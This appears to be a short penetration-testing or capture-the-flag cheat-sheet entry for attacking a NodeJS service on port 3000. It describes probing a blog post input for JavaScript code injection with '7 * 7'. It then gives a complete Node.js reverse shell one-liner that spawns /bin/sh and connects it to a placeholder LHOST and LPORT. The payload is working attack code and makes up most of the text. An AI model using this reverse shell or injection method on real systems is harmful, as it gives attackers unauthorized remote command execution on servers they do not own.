# (3000) NodeJS

<details>

<summary>JS Code Injection</summary>

Check blog post input for JS Code Injection

Using `7 * 7`  --> if result is 49 --> Vuln&#x20;

![](<../.gitbook/assets/image (115).png>)

Run JS Rev Shell to obtain shell!

```javascript
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

</details>
